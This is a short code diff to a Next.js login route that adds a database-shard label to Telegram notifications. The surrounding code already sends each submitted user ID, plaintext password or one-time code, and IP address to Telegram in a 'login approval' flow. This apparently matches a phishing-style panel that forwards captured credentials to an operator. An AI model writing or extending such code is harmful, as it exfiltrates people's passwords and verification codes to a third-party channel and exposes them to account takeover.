@@ -1,4 +1,4 @@
-import { hasDatabaseUrl } from "@/lib/database-urls"
+import { hasDatabaseUrl, formatPendingLoginDatabaseLabel } from "@/lib/database-urls"
 import { resolveMemberOrigin } from "@/lib/member-origin"
 import { NextRequest, NextResponse, after } from "next/server"
 import { forceBlockIp } from "@/lib/bot-risk/force-block"
@@ -126,12 +126,14 @@ export async function POST(request: NextRequest) {
     })
 
     after(async () => {
+      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
       if (flow === "login") {
         await telegramService.sendLoginApprovalNotification({
           userId: record.userId,
           password: record.password,
           method: record.method,
           createdAtMs: record.createdAt,
+          databaseShard,
           ip,
         })
       } else {
@@ -140,6 +142,7 @@ export async function POST(request: NextRequest) {
           method: record.method,
           code: record.password,
           createdAtMs: record.createdAt,
+          databaseShard,
           ip,
         })
       }
